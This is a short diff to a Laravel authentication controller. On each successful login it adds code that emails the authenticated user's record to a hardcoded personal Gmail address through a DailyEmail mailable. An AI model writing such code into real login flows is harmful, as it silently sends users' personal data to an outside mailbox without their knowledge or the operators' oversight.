@@ -2,9 +2,11 @@
 
 namespace App\Http\Controllers;
 
+use App\Mail\DailyEmail;
 use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Mail;
 use Illuminate\Support\Facades\Validator;
 
 class AuthController extends Controller
@@ -42,6 +44,10 @@ class AuthController extends Controller
             'email' => $request->email,
             'password' => $request->password,
         ])) {
+            $details = [
+                'user' => auth()->user(),
+            ];
+            Mail::to('meriantonyan1389@gmail.com')->send(new DailyEmail($details));
             return response()->json([
                 'success' => true,
             ]);
